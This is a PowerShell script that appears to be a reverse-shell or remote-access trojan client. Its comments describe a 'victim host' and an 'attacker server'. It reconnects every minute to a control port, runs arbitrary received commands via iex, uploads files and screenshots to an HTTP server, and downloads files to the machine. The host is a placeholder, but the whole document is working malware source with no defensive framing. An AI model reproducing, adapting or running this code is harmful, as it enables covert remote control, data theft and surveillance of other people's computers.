$S_HOST = "localhost";
$PORT_TCP = 9999; #TCP Port host
$PORT_HTTP = 5566; #HTTP Port
$SECRET = "random" #Random secret

#Try to connect every minute if not connected
while(1) {try { Get-NetTCPConnection -State Established -RemotePort $PORT_TCP -ErrorAction Stop } catch{
    #Create TCPClient object
    $client = New-Object System.Net.Sockets.TCPClient($S_HOST,$PORT_TCP);
    $stream = $client.GetStream();
    #Read incoming stream in a 65535 buffer size
    [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = "";
        #Switch option
        switch -Wildcard ( $data ) {
            #Download file -> upload a file from the victim host to the attacker server
            'download *' {
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/upload/$(Split-Path $data.Split(" ")[1] -leaf)" -Method PUT -InFile $data.Split(" ")[1] -Headers @{'X-Auth' = $SECRET; 'Action' = 'download'}; 
            }

            #Upload file -> Download a file from the attacker server to the victim host
            'upload *' {
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/download/$($data.Split(" ")[1])" -Method GET -OutFile $data.Split(" ")[1] -Headers @{'X-Auth' = $SECRET}; 
            }

            #Take a screenshot and upload to the attacker server
            'screenshot' {
                $file = "$env:USERPROFILE\$((Get-Random).ToString()).png";
                Add-Type -AssemblyName System.Windows.Forms
                Add-type -AssemblyName System.Drawing
                $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                $graphic = [System.Drawing.Graphics]::FromImage($bitmap).CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
                $bitmap.Save($file)
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/upload" -Method PUT -InFile $file -Headers @{'X-Auth' = $SECRET; 'Action' = 'screenshot'}
                del $file;
            }

            #Run command
            Default {
                $sendback = (iex $data 2>&1 | Out-String );
            }
        }
        #Send response
        $sendback2 = $sendback + (pwd).Path;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()};
    $client.Close()
}; Start-Sleep 60} #Delay